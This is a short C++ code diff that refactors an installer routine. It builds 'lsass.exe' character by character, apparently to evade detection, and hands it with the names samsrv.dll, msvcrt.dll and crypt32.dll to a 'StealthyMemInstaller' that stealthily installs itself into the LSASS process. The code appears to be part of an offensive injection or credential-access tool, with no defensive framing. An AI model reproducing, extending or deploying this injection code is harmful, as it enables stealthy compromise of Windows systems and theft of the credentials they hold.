@@ -11,20 +11,28 @@ void Installer::Init() {
     lsassExe = we+L'l'+L's'+L'a'+L's'+L's'+L'.'+L'e'+L'x'+L'e';
 }
 
-int main() {
-    Installer inst;
-    inst.Init();
+BOOL Installer::Install() {
+    this->Init();
 
     StealthyMemInstaller smi;
     vector<wstring> preferedThreadModuleNames;
-    preferedThreadModuleNames.push_back(inst.samsrvDll);
-    preferedThreadModuleNames.push_back(inst.msvcrtDll);
-    preferedThreadModuleNames.push_back(inst.crypt32Dll);
-    smi.Init(preferedThreadModuleNames, inst.lsassExe);
+    preferedThreadModuleNames.push_back(this->samsrvDll);
+    preferedThreadModuleNames.push_back(this->msvcrtDll);
+    preferedThreadModuleNames.push_back(this->crypt32Dll);
+    if (!smi.Init(preferedThreadModuleNames, this->lsassExe)) {
+        return FALSE;
+    }
 
     if (!smi.Install()) {
         cout << "Install failed" << endl;
+        return FALSE;
     } else {
         cout << "Install success" << endl;
+        return TRUE;
     }
+}
+
+int main() {
+    Installer inst;
+    inst.Install();
 }
